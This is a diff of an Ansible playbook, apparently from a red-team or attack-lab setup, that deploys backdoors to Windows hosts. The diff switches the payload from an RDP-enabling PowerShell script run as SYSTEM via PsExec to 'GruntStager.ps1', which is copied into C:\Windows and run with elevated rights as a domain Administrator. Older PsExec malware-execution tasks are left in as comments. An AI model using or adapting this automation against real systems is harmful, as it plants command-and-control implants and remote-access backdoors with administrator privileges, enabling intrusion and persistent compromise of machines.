@@ -1,10 +1,10 @@
--
-  name: Deploy Backdoors
-  hosts: windows
-  strategy: free
-  gather_facts: no
-  tasks:
-    - include: tasks/upload_psexec.yaml
+#-
+#  name: Deploy Backdoors
+#  hosts: windows
+#  strategy: free
+#  gather_facts: no
+#  tasks:
+#    - include: tasks/upload_psexec.yaml
 
 
 
@@ -19,17 +19,48 @@
     - name: Upload Malware
       win_copy:
         src: 'files/{{item}}'
-        dest: 'C:\Windows\System32\{{item}}'
+        dest: 'C:\Windows\{{item}}'
       with_items:
-        - "enable-rdp.ps1"
+        - "GruntStager.ps1"
 
 
-    - name:  Run Malware Files as System
-      win_psexec:
-        command: '{{ item }}'
-        executable: C:\Windows\System32\PsExec.exe
-        elevated: yes
-        system: yes
-        interactive: yes
-      with_items:
-        - "powershell.exe C:\\Windows\\System32\\enable-rdp.ps1"
+    - name: Run multi-lined shell commands
+      win_shell: C:\Windows\GruntStager.ps1  #USE START-PROCESS TO EXECUTE EXE FILES WITH -WAIT OPTION
+      become: yes
+      become_user: CRYPTO\Administrator
+      async: 45
+      poll: 0
+
+
+#    - name:  Run Malware Files as System
+#      win_psexec:
+#        command: '{{ item }}'
+#        executable: C:\Windows\System32\PsExec.exe
+#        elevated: yes
+#        system: yes
+#        interactive: yes
+#      with_items:
+#        - ""
+
+
+
+
+#    - name: Upload Malware
+#      win_copy:
+#        src: 'files/{{item}}'
+#        dest: 'C:\Windows\System32\{{item}}'
+#      with_items:
+#        - "enable-rdp.ps1"
+
+
+
+
+#    - name:  Run Malware Files as System
+#      win_psexec:
+#        command: '{{ item }}'
+#        executable: C:\Windows\System32\PsExec.exe
+#        elevated: yes
+#        system: yes
+#        interactive: yes
+#      with_items:
+#        - "powershell.exe C:\\Windows\\System32\\enable-rdp.ps1"
